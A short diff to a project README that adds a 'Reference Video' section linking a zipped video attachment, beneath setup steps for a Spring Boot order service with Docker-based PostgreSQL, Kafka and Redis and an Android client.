@@ -36,3 +36,8 @@ Infrastructure: Run docker-compose up to start PostgreSQL, Kafka, and Redis.
 Backend: Run the lightning-order-service Spring Boot application.
 
 Android: Open the project in Android Studio and update the BASE_URL in RetrofitClient to your local IP.
+
+# Reference Video
+[Reference.webm.zip](https://github.com/user-attachments/files/25838989/Reference.webm.zip)
+
+
